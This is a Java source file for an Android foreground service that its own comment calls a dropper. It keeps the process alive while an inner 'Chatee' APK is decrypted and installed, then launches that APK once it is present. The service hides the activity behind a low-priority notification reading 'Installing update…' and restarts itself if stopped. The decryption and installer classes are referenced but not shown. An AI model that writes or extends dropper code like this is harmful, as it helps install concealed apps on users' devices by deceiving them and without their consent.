package com.pkg.loader.dispatch;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;

import androidx.core.app.NotificationCompat;

import com.pkg.loader.dispatch.internal.ApkInstaller;
import com.pkg.loader.dispatch.internal.DropperRunner;

/** Keeps dropper process alive while inner Chatee APK is decrypted and installed. */
public class DropperInstallService extends Service {
    private static final String CHANNEL = "dropper_install";
    private static final int NOTIFICATION_ID = 77001;

    private final Handler handler = new Handler(Looper.getMainLooper());
    private Runnable pollTask;

    @Override
    public void onCreate() {
        super.onCreate();
        createChannel();
        Notification notification = new NotificationCompat.Builder(this, CHANNEL)
            .setContentTitle("Chatee")
            .setContentText("Installing update…")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build();
        startForeground(NOTIFICATION_ID, notification);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        DropperRunner.run(this, () -> {
            if (ApkInstaller.isInnerInstalled(this)) {
                stopSelf();
            }
        });
        startPolling();
        return START_STICKY;
    }

    private void startPolling() {
        if (pollTask != null) {
            return;
        }
        pollTask = new Runnable() {
            @Override
            public void run() {
                if (ApkInstaller.isInnerInstalled(DropperInstallService.this)) {
                    ApkInstaller.launchInner(DropperInstallService.this);
                    stopSelf();
                    return;
                }
                handler.postDelayed(pollTask, 2000);
            }
        };
        handler.postDelayed(pollTask, 2000);
    }

    @Override
    public void onDestroy() {
        if (pollTask != null) {
            handler.removeCallbacks(pollTask);
        }
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
            return;
        }
        NotificationChannel channel = new NotificationChannel(
            CHANNEL, "Setup", NotificationManager.IMPORTANCE_LOW);
        channel.setShowBadge(false);
        NotificationManager manager = getSystemService(NotificationManager.class);
        if (manager != null) {
            manager.createNotificationChannel(channel);
        }
    }
}
